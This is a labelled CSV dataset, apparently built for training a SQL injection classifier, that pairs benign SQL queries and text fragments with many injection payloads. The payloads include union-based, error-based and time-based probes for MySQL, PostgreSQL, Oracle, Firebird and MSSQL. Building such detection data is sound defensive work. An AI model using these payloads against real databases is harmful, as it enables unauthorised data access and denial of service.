Sentence,Label,Processed_Sentence
" select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",1.0," select * from users where id  =  0 or 0#""  (   union select null,version  (    )   -- 0"
"  SELECT gave AS add, welcome AS [river]  FROM officer",0.0,"  select gave as add, welcome as [river]  from officer"
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1.0,0  )   and 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  ) 
"  SELECT Orders.riderID, Employees.soon, Employees.diagram FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seemsID ORDER BY Orders.featureID",0.0,"  select orders.riderid, employees.soon, employees.diagram from ordersright join employees on orders.employeeid  =  employees.seemsid order by orders.featureid"
5366,0.0,0
"1  )   as fgqe where 1526  =  1526 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1.0,"0  )   as fgqe where 0  =  0 and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  --"
"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0' where 0  =  0 or 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",1.0,"-0""  )   where 0  =  0 union all select 0,0,0,0#"
2754010000000000,0.0,0
SELECT life FROM bar,0.0,select life from bar
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1.0,"0   )    )     )   union all select null,null,null,null,null,null,null,null,null#"
"  SELECT poolID AS ID, constantly AS airplane FROM hunt",0.0,"  select poolid as id, constantly as airplane from hunt"
rhett,0.0,rhett
"   SELECT stuck, however, horse FROM church WHERE deep  IS NULL",0.0,"   select stuck, however, horse from church where deep  is null"
c/ calzada 169,0.0,c/ calzada 0
8703,0.0,0
"1'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0'   )    )    and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null#",1.0,"0%""  )   union all select null,null,null,null,null,null,null,null,null,null#"
SELECT * FROM completely WHERE bean = 'harder' LIMIT 3,0.0,select * from completely where bean = 'harder' limit 0
azuqueca de henares,0.0,azuqueca de henares
olaya,0.0,olaya
SELECT * FROM test FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM easier,0.0,select * from test fetch first 0 rows only select top 0 percent * from easier
SELECT * FROM atomic FETCH FIRST 3 ROWS ONLY,0.0,select * from atomic fetch first 0 rows only
1'+  (  select 'supo' where 8691  =  8691,1.0,0'+  (  select 'supo' where 0  =  0
SELECT * FROM nearly,0.0,select * from nearly
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",1.0,"0'  )   or   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh"
florescu,0.0,florescu
"1%' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0%' and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down,0.0,select top 0 * from managed select * from upon 0select * from down
"1'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0'  )   or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
"   SELECT road, favorite, badFROM victory WHERE cause  IS NOT NULL",0.0,"   select road, favorite, badfrom victory where cause  is not null"
-2181'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'wyez'  =  'wyez,1.0,-0'  )   or 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )   and   (  'wyez'  =  'wyez
-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1.0,-0%'   )    )     )   or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  '
niembro urkiaga,0.0,niembro urkiaga
SELECT * FROM range WHERE syllable = 'sides',0.0,select * from range where syllable = 'sides'
34112,0.0,0
opsito,0.0,opsito
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1.0,"-0' union all select 0,0,0,0,0,0,0,0,0--"
"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1.0,"0%""  )   or 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )    and   (  ""%""  =  """
1' where 5455  =  5455 and sleep  (  5  )  --,1.0,0' where 0  =  0 and sleep  (  0  )  --
"   SELECT COUNT ( blanket ) , took FROM none BY seat",0.0,"   select count ( blanket ) , took from none by seat"
"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",1.0,"-0'   )    )     )   or elt  (  0  =  0,0  )   and    (    (     (  'jdst'  =  'jdst"
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1.0,0' where 0  =  0 or   (  select * from   (  select  (  sleep  (  0   )    )     )  sddo  )  #
85233754d,0.0,0d
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""  )    (  ""  =  0 or 0  =  0 -- 0"
" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1.0," select * from users where id  =  0<@<@ union select 0,version  (    )   -- 0"
1  )   where 5025  =  5025,1.0,0  )   where 0  =  0
SELECT * FROM strong WHERE NOT swam = 'from'  AND NOT deal = 'cloth',0.0,select * from strong where not swam = 'from'  and not deal = 'cloth'
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1.0,"0 and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )  "
1'+  (  select ksoh where 6339  =  6339,1.0,0'+  (  select ksoh where 0  =  0
"-2378"" where 2686  =  2686 or 6872  =  6872--",1.0,"-0"" where 0  =  0 or 0  =  0--"
"-4280%""   )    )     )   union all select 7981,7981--",1.0,"-0%""   )    )     )   union all select 0,0--"
"-1152%'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  '",1.0,"-0%'  )   or 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and   (  '%'  =  '"
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""wvyb""  =  ""wvyb",1.0,"0""   )    )     )   or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and    (    (     (  ""wvyb""  =  ""wvyb"
SELECT * FROM married,0.0,select * from married
"1""   )    )    as jrld where 3488  =  3488",1.0,"0""   )    )    as jrld where 0  =  0"
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,1.0,0'  )   and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw
1'  )   where 1115  =  1115,1.0,0'  )   where 0  =  0
SELECT hello ( s ) FROM task INNER JOIN,0.0,select hello ( s ) from task inner join
" end and ""unqj""  =  ""unqj",1.0," end and ""unqj""  =  ""unqj"
"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1.0,"0' where 0  =  0 and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )   --"
SELECT automobile ( s )  FROM while LEFT JOIN,0.0,select automobile ( s )  from while left join
SELECT TOP 50 PERCENT * FROM military SELECT * FROM danger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM language,0.0,select top 0 percent * from military select * from danger fetch first 0 percent rows onlyselect top 0 * from language
"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",1.0,"-0' where 0  =  0 union all select 0,0,0,0,0--"
SELECT * FROM fall WHERE doctor NOT LIKE 'arrow%',0.0,select * from fall where doctor not like 'arrow%'
"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1.0,"0' in boolean mode  )   and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )  #"
SELECT * FROM  ( SELECT instrument FROM busy ) ,0.0,select * from  ( select instrument from busy ) 
gunner@piaceredelivery.kw,0.0,gunner@piaceredelivery.kw
SELECT TOP 3 * FROM equally SELECT * FROM enjoy 3SELECT * FROM duck,0.0,select top 0 * from equally select * from enjoy 0select * from duck
"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1.0,"0' in boolean mode  )   union all select null,null,null,null,null,null,null#"
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk",1.0,"0'   )    )    and 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   and    (    (   'jylk'  =  'jylk"
SELECT student ( s )  FROM ball UNION,0.0,select student ( s )  from ball union
"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",1.0,"-0""  )   or 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms"
SELECT * FROM continent FETCH FIRST 3 ROWS ONLY,0.0,select * from continent fetch first 0 rows only
" SELECT * FROM Customers  ORDER BY Country, CustomerName;",0.0," select * from customers  order by country, customername;"
SELECT * FROM discover FETCH FIRST 3 ROWS ONLY,0.0,select * from discover fetch first 0 rows only
"-8005""  )   union all select 5213,5213,5213,5213,5213--",1.0,"-0""  )   union all select 0,0,0,0,0--"
" SELECT * FROM wrapped ORDER BY slipped ASC, highest DESC",0.0," select * from wrapped order by slipped asc, highest desc"
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'uadr' like 'uadr",1.0,"0'   )    )    and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )   and    (    (   'uadr' like 'uadr"
"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1.0,"0'   )    )    as xrre where 0  =  0 and updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )  --"
"INSERT INTO eye  ( above, article, printed )  VALUES  ( 'plain', 'own', 'selection' )  ",0.0,"insert into eye  ( above, article, printed )  values  ( 'plain', 'own', 'selection' )  "
"   SELECT COUNT ( palace ) , important FROM congress BY pool",0.0,"   select count ( palace ) , important from congress by pool"
pas63a0a,0.0,pas0a0a
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood',0.0,select * from complex where struck = 'chosen'  or measure = 'blood'
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1.0,"0%'   )    )     )   union all select null,null,null,null,null,null,null--"
"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1.0,"-0%""  )   or 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    and   (  ""%""  =  """
"1"" where 8483  =  8483 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0"" where 0  =  0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1.0,0  )   as cinw where 0  =  0 and 0  =    (  select 0 from pg_sleep  (  0   )    )   --
prell@davidymamen.tc,0.0,prell@davidymamen.tc
SELECT * FROM shelter,0.0,select * from shelter
SELECT * FROM planned  WHERE cabin = congress,0.0,select * from planned  where cabin = congress
SELECT * FROM lost 3,0.0,select * from lost 0
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1.0,select * from users where id  =  0 or $<\. or 0  =  0 -- 0
" SELECT * FROM Products WHERE ProductName BETWEEN ""Carnarvon Tigers"" AND ""Chef Anton's Cajun Seasoning"" ORDER BY ProductName;",0.0," select * from products where productname between ""carnarvon tigers"" and ""chef anton's cajun seasoning"" order by productname;"
1%'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1.0,0%'   )    )    and 0  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and    (    (   '%'  =  '
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'sqni' like 'sqni",1.0,"0'  )   and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and   (  'sqni' like 'sqni"
